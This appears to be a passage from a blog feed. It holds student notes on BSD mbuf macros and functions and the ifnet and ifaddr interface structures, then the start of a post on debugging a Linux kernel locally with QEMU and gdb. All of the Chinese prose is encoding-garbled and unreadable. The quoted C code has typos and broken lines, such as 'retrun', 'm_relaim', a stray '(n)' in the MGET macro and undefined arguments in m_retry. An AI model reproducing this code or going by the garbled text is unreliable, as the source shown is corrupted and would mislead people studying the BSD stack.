href="#ç®€å•çš„mbufå®å’Œå‡½æ•°" class="headerlink" title="ç®€å•çš„mbufå®å’Œå‡½æ•°"></a>ç®€å•çš„mbufå®å’Œå‡½æ•°</h3><h4 id="MGETå®"><a href="#MGETå®" class="headerlink" title="MGETå®"></a>MGETå®</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MGET(m, how, type) &#123; \</span><br><span class="hljs-meta">MALLOC((m), struct mbuf *, MSIZE, mbtypes [type], (how)); \</span><br><span class="hljs-meta"><span class="hljs-keyword">if</span>(m)&#123;\</span><br><span class="hljs-meta">(m)-&gt;m_type = (type); \</span><br><span class="hljs-meta">MBUFLOCK (mbstat.m_mtypes [type]++;) \</span><br><span class="hljs-meta">(n)-&gt;m_next = (struct mbuf * )NULL; \</span><br><span class="hljs-meta">(m)-&gt;m_nextpkt = (struct mbuf *)NULL; \</span><br><span class="hljs-meta">(m) -&gt;m_data = (m)-&gt;m_dat; \</span><br><span class="hljs-meta">(m)-&gt;m_flags = 0; \</span><br><span class="hljs-meta">&#125; <span class="hljs-keyword">else</span> \</span><br><span class="hljs-meta">(m) = m_retry((how)ï¼Œ(type)); \</span><br></code></pre></td></tr></table></figure><p> è¿™é‡Œå°±ä¸åšæºç ä¸Šè¯¦ç»†è§£é‡Šï¼Œè‡ªå·±çœ‹åº”è¯¥èƒ½æ‡‚ã€‚åªç¨å¾®è¯´å‡ ä¸ªç‚¹ï¼š</p><ul><li><code>MBUFLOCK</code>å®æ˜¯ç”¨æ¥ä¿è¯æ‰§è¡Œ<code>mbstat.m_mtypes[type]++</code>çš„ä¼˜å…ˆçº§ï¼Œé˜²æ­¢+1æ—¶è¢«æ‰“æ–­</li><li><code>m-&gt;data = m-&gt;dat</code>æ˜¯è®©dataæŒ‡å‘ç¼“å­˜åŒºåŸŸçš„å¼€å§‹åœ°å€</li><li>elseåˆ†æ”¯é‡Œé¢æ˜¯mallocåˆ†é…å¤±è´¥æ—¶çš„å¤„ç†</li></ul><blockquote><p>mbstat æ˜¯ä¸€ä¸ªç”¨æ¥ç®¡ç†mbufçš„å…¨å±€å˜é‡ï¼Œå‰é¢æˆ‘å¹¶æ²¡æœ‰æåˆ°ã€‚æ˜¯å› ä¸ºæˆ‘è§‰å¾—è¿™ä¸ªä¸œè¥¿å¯èƒ½ä¸æ˜¯é‚£ä¹ˆé‡è¦ï¼Œæ²¡è¯¦ç»†å»çœ‹ğŸ˜€</p></blockquote><h4 id="m-getå‡½æ•°"><a href="#m-getå‡½æ•°" class="headerlink" title="m_getå‡½æ•°"></a>m_getå‡½æ•°</h4> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> mbuf* <span class="hljs-title function_">m_get</span><span class="hljs-params">(nowait, type)</span><br><span class="hljs-type">int</span> nowait, type;<br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mbuf</span> *<span class="hljs-title">m</span>;</span><br>    <br>    MGET(m, nowait, type);<br>    retrun (m);<br>&#125;<br></code></pre></td></tr></table></figure><p>æ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œå°±æ˜¯MGETå®å¥—äº†ä¸ªå‡½æ•°å¤–å¥—ã€‚nowaitçš„å€¼ä¸ºM_WAITæˆ–M_DONTWAITï¼Œå–å†³äºåœ¨å­˜å‚¨å™¨ä¸å¯ç”¨æ—¶æ˜¯å¦ç­‰å¾…ã€‚</p><h4 id="m-retryå‡½æ•°"><a href="#m-retryå‡½æ•°" class="headerlink" title="m_retryå‡½æ•°"></a>m_retryå‡½æ•°</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> mbuf* <span class="hljs-title function_">m_retry</span><span class="hljs-params">(i, t)</span><br><span class="hljs-type">int</span> i, t;<br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mbuf</span> *<span class="hljs-title">m</span>;</span><br>    <br>    m_relaim();<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> m_retry(i,t)(struct mbuf *)0</span><br>    MGET(m, nowait, type);<br><span class="hljs-meta">#<span class="hljs-keyword">undef</span> m_retry</span><br>    retrun (m);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ˜¯MGETå®çš„elseåˆ†æ”¯æ‰§è¡Œçš„å‡½æ•°ï¼Œé€šè¿‡<code>m_relaim()</code>è¯•å›¾è…¾å‡ºä¸€éƒ¨åˆ†ç©ºé—´ï¼Œç„¶åå†æ¬¡å°è¯•MGET</p><h4 id="m-devgetå‡½æ•°"><a href="#m-devgetå‡½æ•°" class="headerlink" title="m_devgetå‡½æ•°"></a>m_devgetå‡½æ•°</h4><p>å½“æ¥æ”¶åˆ°ä»¥å¤ªç½‘å¸§æ—¶ï¼Œè®¾å¤‡é©±åŠ¨ç¨‹åºè°ƒç”¨å‡½æ•°<code>m_devget()</code>åˆ›å»ºmbufæ¥æ¥å—æ•°æ®ï¼Œæ ¹æ®æ•°æ®é•¿åº¦ä¸åŒï¼Œä¼šå½¢æˆå››ç§ç±»å‹çš„mbufé“¾è¡¨,å¦‚ä¸‹é¢æ‰€ç¤ºï¼š</p><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424194426443.png" alt="image-20230424194426443"></p><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424194444638.png" alt="image-20230424194444638"></p><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424194434240.png" alt="image-20230424194434240"></p><h4 id="mtodå’Œdtomå®"><a href="#mtodå’Œdtomå®" class="headerlink" title="mtodå’Œdtomå®"></a>mtodå’Œdtomå®</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span>mtod(m, t)((t) ((m)-&gt;m_data) )</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>dtom(x)((struct mbuf *) ((int) (x) &amp; ~ (MSIZE-1)))</span><br></code></pre></td></tr></table></figure><p><code>mtod()</code>å®å¯ä»¥ç›´æ¥ç†è§£æˆ<strong>mbuf to data</strong>ï¼Œå³è¿”å›mbufä¸­çš„m_dataæŒ‡é’ˆï¼Œä¸è¿‡é¢å¤–åšäº†ç±»å‹è½¬æ¢</p><p> <code>dtom()</code>å¯ä»¥ç†è§£ä¸º<strong>data to mbuf</strong>ï¼Œå³é€šè¿‡dataæŒ‡é’ˆè¿”å›æŒ‡å‘mbufçš„æŒ‡é’ˆ</p><blockquote><p>dtom()å®é™…åŸç†ä¹Ÿæ¯”è¾ƒç®€å•ï¼ŒMSIZEä¸º128ï¼Œé‚£ä¹ˆ~(MSIZE-1)å…¶å®å°±æ˜¯0xffffff80ï¼Œå¯ä»¥æ˜æ˜¾çœ‹åˆ°byteçš„äºŒè¿›åˆ¶å½¢å¼ä½ 1000 0000é€šè¿‡æ¸…ç†ä½ä½æ¥æ‰¾åˆ°mbufçš„èµ·å§‹åœ°å€ã€‚ç”±äºæœ¬ä¹¦å…¨æ˜¯32ä½çš„ç³»ç»Ÿï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä¹Ÿç”¨çš„æ˜¯32ä½çš„åœ°å€ä¸¾ä¾‹ã€‚</p></blockquote><p>çŸ¥é“<code>dtom()</code>çš„åŸç†ï¼Œå¾ˆå®¹æ˜“å°±å‘ç°å…¶åªé€‚ç”¨äºä¸å«é¢å¤–æ‰©å®¹çš„mbufç»“æ„ï¼Œæ­¤æ—¶éœ€è¦<code>m_pullup</code>å¤„ç†</p><h4 id="m-pullup"><a href="#m-pullup" class="headerlink" title="m_pullup"></a>m_pullup</h4><h5 id="ä½œç”¨1"><a href="#ä½œç”¨1" class="headerlink" title="ä½œç”¨1"></a>ä½œç”¨1</h5><p>å½“æ•°æ®æŠ¥é•¿åº¦å°äºåè®®é¦–éƒ¨å¤§å°æ—¶ï¼Œ<code>m_pullup</code>ä¼šå°†å‰Nä¸ªå­—èŠ‚æ•°æ®é‡ç»„åœ¨ç¬¬ä¸€ä¸ªmbufä¸­ï¼Œè¯•å›¾æ¢å¤æ­£å¸¸çš„åè®®é¦–éƒ¨ã€‚Nä¸ºä¼ å…¥å‚æ•°ï¼Œä½†æ˜¯å½“mbufé“¾è¡¨ä¸Šæ•°æ®æ€»é•¿åº¦å°äºNæ—¶ï¼Œå‡½æ•°å°†å¤±æ•ˆï¼Œè¯¥æ•°æ®æŠ¥ä¼šè¢«ä¸¢å¼ƒã€‚</p><h5 id="ä½œç”¨2"><a href="#ä½œç”¨2" class="headerlink" title="ä½œç”¨2"></a>ä½œç”¨2</h5><p>å°±æ˜¯åˆšåˆšè°ˆåˆ°çš„<code>dtom()</code>é—®é¢˜ï¼Œå½“mbufä¸­æœ‰æ‰©å®¹åœ°å€æˆ–è€…è¯´æ•°æ®åœ¨â€œç°‡â€ä¸­å­˜æ”¾æ—¶ï¼Œè¿™é‡Œ<code>m_pullup</code>ï¼Œå°†ä¼šæ–°å»ºä¸€ä¸ªmbufæ’å…¥é“¾è¡¨å¤´ï¼Œå¹¶æŠŠç°‡çš„å‰40ä¸ªbyteæ‹·è´è¿‘æ–°çš„mbufé“¾è¡¨å¤´å†…ã€‚</p><blockquote><p>40ä¸ªå­—èŠ‚æ˜¯å› ä¸ºæœ€å¤§çš„åè®®é¦–éƒ¨ä¸º40ï¼ˆ20 IPé¦–éƒ¨+20 TCPé¦–éƒ¨ï¼‰ï¼Œè¿™æ ·å¯ä»¥ä¿è¯åœ¨åç»­ä¼ ç»™é«˜å±‚åè®®å¤„ç†æ—¶ï¼Œå¯ä»¥æ­£å¸¸å¤„ç†ã€‚</p><p>ä¸‹å›¾2-17ä¸ºå¤„ç†å‰ï¼Œ2-18ä¸ºå¤„ç†åã€‚å¦å¤–éœ€è¦æ³¨æ„åˆ°ï¼Œå¤„ç†åçš„m_dataæŒ‡é’ˆæŒ‡å‘äº†ç°‡å†…å»é™¤40byteä¹‹åçš„ä½ç½®ï¼ŒéªŒè¯äº†æˆ‘ä»¬ä¹‹å‰è°ˆåˆ°çš„m_dataæŒ‡å‘çš„æ˜¯æ•°æ®çš„èµ·å§‹ï¼Œè€Œä¸æ˜¯ç¼“å­˜åŒºåŸŸçš„èµ·å§‹ã€‚</p></blockquote><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424202823136.png" alt="image-20230424202823136"></p><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424202834314.png" alt="image-20230424202834314"></p><p>å¦å¤–éœ€è¦æ³¨æ„ï¼ŒTCPä¸ä½¿ç”¨<code>m_pullup()</code>ï¼Œè€Œæ˜¯é‡‡å–å¦å¤–ä¸åŒçš„æŠ€æœ¯</p><h3 id="è”ç½‘æ•°æ®ç»“æ„å°ç»“"><a href="#è”ç½‘æ•°æ®ç»“æ„å°ç»“" class="headerlink" title="è”ç½‘æ•°æ®ç»“æ„å°ç»“"></a>è”ç½‘æ•°æ®ç»“æ„å°ç»“</h3><blockquote><p>ä¸ªäººæ„Ÿè§‰å‰é¢å“ªäº›è¯¦ç»†åˆ†æå·²ç»å·®ä¸å¤šäº†ï¼Œè¿™æ•°æ®ç»“æ„è‡ªå·±ä¹Ÿåº”è¯¥èƒ½ç”»å‡ºæ¥ğŸ˜ï¼Œå°±æ”¾ä¸¤å¼ å›¾çœ‹çœ‹å°±å¥½</p></blockquote><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424203817974.png" alt="image-20230424203817974"></p><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424203829722.png" alt="image-20230424203829722"></p><h3 id="m-copyå’Œç°‡å¼•ç”¨è®¡æ•°"><a href="#m-copyå’Œç°‡å¼•ç”¨è®¡æ•°" class="headerlink" title="m_copyå’Œç°‡å¼•ç”¨è®¡æ•°"></a>m_copyå’Œç°‡å¼•ç”¨è®¡æ•°</h3><blockquote><p>è¿™ä¸ªpartæ˜¯ä¸€ä¸ªæ¯”è¾ƒæœ‰è¶£çš„éƒ¨åˆ†ï¼Œä½†æµç¨‹ç›¸å¯¹æ¥è¯´ä¹Ÿæ›´å¤æ‚ä¸€äº›</p></blockquote><p>è¿™é‡Œæˆ‘ä»¬å‡è®¾ä¸€ä¸ªä¾‹å­ï¼Œä¸€ä¸ªç¨‹åºæƒ³æŠŠå…±4096byteå†™å…¥åˆ°TCPæ’å£å½“ä¸­ï¼Œä¸”TCPä¼ è¾“çš„æœ€å¤§æŠ¥æ–‡å¤§å°ä¸º1460ã€‚é‚£ä¹ˆåŸºæœ¬æµç¨‹å¦‚ä¸‹:</p><ol><li>å…ˆæŠŠå‰2048ä¸ªbyteæ”¾å…¥ä¸€ä¸ªç°‡å†…ï¼Œå¦‚ä¸‹å›¾<img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424205327832.png" alt="image-20230424205327832"></li><li>æ–°å»ºä¸€ä¸ªmbufä½œä¸ºå‘é€å‡ºå»çš„mbufåˆ†ç»„é¦–éƒ¨ï¼ˆå·¦ä¸‹ï¼‰ï¼Œå†å»ºä¸€ä¸ªmbufä¸æ­¥éª¤1å»ºç«‹çš„mbufå…±äº«ç°‡ï¼ˆå³ä¸‹ï¼‰ï¼Œå¹¶è®¾ç½®m_lenä¸º1460ï¼Œè¡¨ç¤ºåªå–å‰é¢1460ï¼Œå¦‚å›¾<img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424205805136.png" alt="image-20230424205805136"></li><li>å°†è¿™1460çš„æ•°æ®ä¼ è¾“å‡ºå»ï¼Œç„¶åé‡Šæ”¾æ‰mbuf</li><li>æ–°å»ºä¸€ä¸ªmbufï¼ˆå³ä¸Šï¼‰ç”¨äºå­˜æ”¾å2048çš„byteï¼ŒåŒæ­¥éª¤2æ–°å»ºbufé“¾è¡¨ï¼Œä¸è¿‡é“¾è¡¨ç¬¬2ä¸ªmbufæŒ‡å‘ä¹‹å‰æœªç”¨å®Œçš„ç°‡ååŠéƒ¨åˆ†ï¼Œç¬¬ä¸‰ä¸ªmbufæŒ‡å‘æ–°çš„2048<img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424210301395.png" alt="image-20230424210301395"></li><li>ä¸æ–­é‡å¤ç±»ä¼¼ä¸Šè¿°æ“ä½œï¼Œé€šè¿‡å…±äº«ç°‡ï¼Œå°†æ‰€æœ‰æ•°æ®ä¼ è¾“å‡ºå»</li></ol><blockquote><p>ç°‡å¼•ç”¨è®¡æ•°ç”¨æ¥è¡¨ç¤ºä¸€ä¸ªç°‡åŒæ—¶è¢«å‡ ä¸ªmbufæŒ‡å‘ã€‚æ¯å½“é‡Šæ”¾ä¸€ä¸ªmbufï¼Œè¯¥mbufæ‰€æŒ‡å‘çš„ç°‡çš„å¼•ç”¨è®¡æ•°-1ï¼Œå½“ä¸”ä»…å½“ç°‡çš„å¼•ç”¨è®¡æ•°ä¸º0æ—¶ï¼Œç°‡å¯ä»¥è¢«é‡Šæ”¾ã€‚è¿™æ˜¯ä¸ºäº†é˜²æ­¢åœ¨å…±äº«ç°‡æ—¶ï¼Œä¸Šè¿°æ“ä½œä¸­çš„é‡Šæ”¾mbufå¯èƒ½ä¼šå¯¼è‡´é‡Šæ”¾æ‰å…±äº«çš„ç°‡è€Œå¯¼è‡´æ•°æ®ä¸¢å¤±ã€‚</p></blockquote><h2 id="ç¬¬ä¸‰ç« -æ¥å£å±‚"><a href="#ç¬¬ä¸‰ç« -æ¥å£å±‚" class="headerlink" title="ç¬¬ä¸‰ç«  æ¥å£å±‚"></a>ç¬¬ä¸‰ç«  æ¥å£å±‚</h2><h3 id="ifnetç»“æ„"><a href="#ifnetç»“æ„" class="headerlink" title="ifnetç»“æ„"></a>ifnetç»“æ„</h3><p>ç»“æ„ifnetä¸­åŒ…å«æ‰€æœ‰æ¥å£çš„é€šç”¨ä¿¡æ¯ï¼Œæ¯ä¸ªç½‘ç»œè®¾å¤‡æ‹¥æœ‰ç‹¬ç«‹çš„ifnetç»“æ„ã€‚ifnetç»“æ„æœ‰ä¸€ä¸ªåˆ—è¡¨ï¼ŒåŒ…å«è¿™ä¸ªè®¾å¤‡çš„ä¸€ä¸ªæˆ–å¤šä¸ªåè®®åœ°å€ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ifnet</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ifnet</span> *<span class="hljs-title">if_next</span>;</span><span class="hljs-comment">/* a11 struct ifnets are chained */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ifaddr</span> *<span class="hljs-title">if_addrlist</span>;</span> <span class="hljs-comment">/* linked list of addresses per if */</span><br>    <span class="hljs-type">char</span> *if_name;<span class="hljs-comment">/* name, e.g. &#x27;le&#x27; or &#x27;lo&#x27; */</span><br>    <span class="hljs-type">short</span> if_unit;<span class="hljs-comment">/* sub-unit for lower level driver */</span><br>    u_short if_index;<span class="hljs-comment">/* numeric abbreviation for this if */</span><br>    <span class="hljs-type">short</span> if_flags ;<span class="hljs-comment">/* Figure 3.7 */</span><br>    <span class="hljs-type">short</span> if_timer ;<span class="hljs-comment">/* time &#x27;ti1 if_watchdog called */</span><br>    <span class="hljs-type">int</span> if_pcount;<span class="hljs-comment">/* number of promiscuous listeners */</span><br>    <span class="hljs-type">caddr_t</span> if_bpf;<span class="hljs-comment">/* packet filter structure */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">if_</span> _<span class="hljs-title">data</span> &#123;</span><br>        <span class="hljs-comment">/* generic interface information */</span><br>        u_char ifi_type;<span class="hljs-comment">/* Figure 3.9 */</span><br>        u_char ifi_addr1en;<span class="hljs-comment">/* media address 1ength */</span><br>        u_char ifi_harlen;<span class="hljs-comment">/* media header length */</span><br>        u_1ong ifi_mtu;<span class="hljs-comment">/* maximum transmission unit */</span><br>        u_long ifi_metric ;<span class="hljs-comment">/* lrouting metric (external on1y) */</span><br>        u_1ong ifi_baudrate;<span class="hljs-comment">/* linespeed */</span><br>        <br>        <span class="hljs-comment">/* other ifner members */</span><br>    <span class="hljs-meta">#<span class="hljs-keyword">define</span> if_mtu if_data.ifi_mtu</span><br>    <span class="hljs-meta">#<span class="hljs-keyword">define</span> if_type if_data.ifi_type</span><br>    <span class="hljs-meta">#<span class="hljs-keyword">define</span> if_addrlen if_data.ifi_addrlen</span><br>    <span class="hljs-meta">#<span class="hljs-keyword">define</span> if_hdrlen if_data.ifi_hdrlen</span><br>    <span class="hljs-meta">#<span class="hljs-keyword">define</span> if_metric if_data.ifi_metric</span><br>    <span class="hljs-meta">#<span class="hljs-keyword">define</span> if_baudrate if_data.ifi_baudrate</span><br></code></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œæ¯ä¸ªéƒ¨åˆ†éƒ½æœ‰æ³¨é‡Šï¼Œå°±ä¸ç”¨æˆ‘è§£é‡Šäº†å§ğŸ˜­ï¼Œå›°æ­»äº†è¦ï¼Œè¿™äº›bä¸œè¥¿èƒ½è€ƒä»€ä¹ˆï¼Œå“¥ä»¬ä¹ŸèƒŒä¸ä¸‹æ¥å•Š</p></blockquote><ul><li>if_next å°†æ‰€æœ‰ifneté“¾æ¥ä¸ºä¸€ä¸ªå•é“¾è¡¨</li><li>if_addrlist æŒ‡å‘<code>ifaddr&#123;&#125;</code>ç»“æ„åˆ—è¡¨ï¼Œæ¯ä¸ª<code>ifaddr&#123;&#125;</code>ä¸ä¸€ä¸ªåè®®ç›¸å¯¹åº”</li><li>if_name ç”¨äºæ ‡è¯†æ¥å£çš„ç±»å‹</li><li>if_unit ç”¨äºæ ‡è¯†å¤šä¸ªç›¸åŒç±»å‹çš„å®ä¾‹</li><li>if_indexåœ¨å†…æ ¸ä¸­å”¯ä¸€è¡¨ç¤ºè¿™ä¸ªæ¥å£</li><li>if_flagsè¡¨æ˜æ¥å£çš„æ“ä½œçŠ¶æ€å’Œå±æ€§</li><li>if_timerä»¥ç§’ä¸ºå•ä½è®°å½•æ—¶é—´</li><li>if_pcountå’Œif_bpfï¼Œæ”¯æŒBSDåˆ†ç»„è¿‡æ»¤å™¨</li></ul><h3 id="ifaddrç»“æ„"><a href="#ifaddrç»“æ„" class="headerlink" title="ifaddrç»“æ„"></a>ifaddrç»“æ„</h3><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424220517917.png" alt="image-20230424220517917"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ifaddr</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ifaddr</span> *<span class="hljs-title">ifa_next</span>;</span><span class="hljs-comment">/* next address for interface */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ifnet</span> *<span class="hljs-title">ifa_ifp</span>;</span><span class="hljs-comment">/* back-pointer to interface */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span> *<span class="hljs-title">ifa_addr</span> ;</span> <span class="hljs-comment">/* address of interface */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span> *<span class="hljs-title">ifa_dstaddr</span> ;</span><span class="hljs-comment">/* other end of p-to-p link */</span><br>    <span class="hljs-meta">#<span class="hljs-keyword">define</span> ifa_broadaddr ifa_dstaddr<span class="hljs-comment">/* broadcast address interface */</span></span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span>* <span class="hljs-title">ifa_netmask</span>;</span><span class="hljs-comment">/* used to determine subnet */</span><br>    <span class="hljs-type">void</span> (*ifa_rtrequest) ();<span class="hljs-comment">/* check or clean routes */</span><br>    u_short ifa_f1ags;<span class="hljs-comment">/*mostly rt_ flags for cloning */</span><br>    <span class="hljs-type">short</span> ifa_refcnt;<span class="hljs-comment">/* references to this structure */</span><br>    <span class="hljs-type">int</span> ifa_metric;<span class="hljs-comment">/* cost for this interface */</span><br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>æ„Ÿè§‰è¿™ä¸¤ä¸ªç»“æ„åªè¦ææ‡‚å›¾å°±å·®ä¸å¤šäº†å§ğŸ˜­</p></blockquote><h3 id="sockaddr"><a href="#sockaddr" class="headerlink" title="sockaddr"></a>sockaddr</h3><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424221919519.png" alt="image-20230424221919519"></p><blockquote><p>çœ‹çœ‹å›¾å·®ä¸å¤šå¾—äº†ï¼Œè¿™bè¯¾çœŸè¯¥æ­»å•ŠğŸ˜…</p></blockquote><h3 id="if-attach"><a href="#if-attach" class="headerlink" title="if_attach"></a>if_attach</h3><blockquote><p>ç”¨æ¥å®Œæˆifnetç»“æ„çš„åˆå§‹åŒ–å’Œæ­å»ºï¼Œç¬¬ä¸‰ç« æ˜¯çœŸé€†å¤©ï¼Œå·®ä¸å¤šå¾—äº†</p></blockquote><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424222838348.png" alt="image-20230424222838348"></p><p><code>if_attach</code>è¢«è°ƒç”¨äº†ä¸‰æ¬¡: ä»¥ä¸€ä¸ª<code>le_softc</code>ç»“æ„ä¸ºå‚æ•°ä»<code>leattach</code>è°ƒç”¨ï¼Œä»¥ä¸€ä¸ª<code>sl_softc</code>ç»“æ„ä¸ºæ•°ä»<code>slattach</code>è°ƒç”¨ï¼Œä»¥ä¸€ä¸ªé€šç”¨<code>ifnet</code>ç»“æ„ä¸ºå‚æ•°ä»<code>loopattach</code>è°ƒç”¨ã€‚æ¯æ¬¡è°ƒç”¨æ—¶ï¼Œå®ƒå‘ifnetåˆ—è¡¨ä¸­æ·»åŠ ä¸€ä¸ªçš„<code>ifnet</code>ç»“æ„ï¼Œä¸ºè¿™ä¸ªæ¥å£åˆ›å»ºä¸€ä¸ªé“¾è·¯å±‚<code>ifaddr</code>ç»“æ„(åŒ…å«ä¸¤ä¸ª<code>sockaddr_dl</code>ç»“æ„)ï¼Œå¹¶ä¸”åˆå§‹åŒ–<code>ifnet_addrs</code>æ•°ç»„ä¸­çš„ä¸€é¡¹ã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€kernelã€‘å†…æ ¸æœ¬åœ°è°ƒè¯•å…¥é—¨</title>
    <link href="/2023/03/31/%E3%80%90Linux%20kernel%E5%85%A5%E9%97%A8%E3%80%91%E5%86%85%E6%A0%B8%E6%9C%AC%E5%9C%B0%E8%B0%83%E8%AF%95/"/>
    <url>/2023/03/31/%E3%80%90Linux%20kernel%E5%85%A5%E9%97%A8%E3%80%91%E5%86%85%E6%A0%B8%E6%9C%AC%E5%9C%B0%E8%B0%83%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h2 id="æå–vmlinux"><a href="#æå–vmlinux" class="headerlink" title="æå–vmlinux"></a>æå–vmlinux</h2><p>ä½¿ç”¨extract-vmlinuxè„šæœ¬æå–ï¼Œè„šæœ¬ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">linux&#x2F;extract-vmlinux at master Â· torvalds&#x2F;linux (github.com)</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./extract-vmlinux ./bzImage &gt; vmlinux<br></code></pre></td></tr></table></figure><h3 id="å¼€æ”¾è°ƒè¯•ç«¯å£"><a href="#å¼€æ”¾è°ƒè¯•ç«¯å£" class="headerlink" title="å¼€æ”¾è°ƒè¯•ç«¯å£"></a>å¼€æ”¾è°ƒè¯•ç«¯å£</h3><p>åœ¨<code>boot.sh</code>ä¸­åŠ å…¥å¦‚ä¸‹å‚æ•°</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">-gdb tcp::[port]<br><span class="hljs-meta prompt_">#</span><span class="language-bash">å¦‚ä¸‹</span><br>-gdb tcp::1234<br></code></pre></td></tr></table></figure><p>å¯åŠ¨<code>boot.sh</code></p><h3 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h3><ul><li>rootæƒé™ä¸‹è¿è¡Œ</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gdb ./vmlinux -q<br></code></pre></td></tr></table></figure><ul><li>å¯¼å…¥ç¬¦å·è¡¨</li></ul><figure class="highlight shell"><table><tr><td 